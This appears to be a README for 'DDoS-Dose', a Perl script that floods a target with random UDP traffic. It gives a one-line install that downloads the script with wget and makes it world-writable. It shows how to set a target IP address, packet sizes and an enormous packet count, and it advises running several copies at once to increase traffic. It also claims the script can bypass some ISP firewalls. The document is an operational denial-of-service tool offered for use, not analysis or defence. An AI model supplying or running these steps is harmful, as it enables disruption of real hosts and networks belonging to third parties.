# UDP Script for DDoS-Dose !

## Features

- Generate Random UDP Traffic
- From Random Port
- To Random Port
- Require HPC (High Performance Computing) Server
- Can bypass some ISP Firewalls
- Language: Perl
- Spoofed: No (doesn't include IP header Modification)


## Installation

One Line Setup for Debian Based distro ~ Ubuntu, Debian

```bash
  apt update -y && apt install perl -y && apt install wget -y && wget https://raw.githubusercontent.com/cyberceros/ddos-dose/main/Layer4/UDP/random-udp%20%7C%20ID%3AA1/random-udp.pl && chmod 777 *

```
    

## Usage

```
Enter Target ---> 
my $target_host = "117.203.8.210"; (Line6)
```
```
You can edit Packet Size on Script --->
my $max_size = 100; (Line 7) Define the max packet size
my $min_size = 50;  (Line 8) Define the min packet size
```
```
You can set how much packet sent to Host? --->
my $packet_count = 1000000000000000; (Line9)
```
```
perl random-udp.pl
```
```
YOU CAN RUN IT MULTIPLE TIME TO INCREASE TRAFFIC LIKE - Depends on CPU/RAM
perl random-udp.pl & perl random-udp.pl & perl random-udp.pl
---> Multithreading Causing Issue
```


## Related

want to pass the Target IP, Packet Size, Packet Count in Command Line

[Click Here for that Script](https://github.com/cyberceros/)


## Authors

- [@cyberceros](https://www.github.com/cyberceros)


## Feedback

If you have any feedback, please reach out to us at n@dultr.in

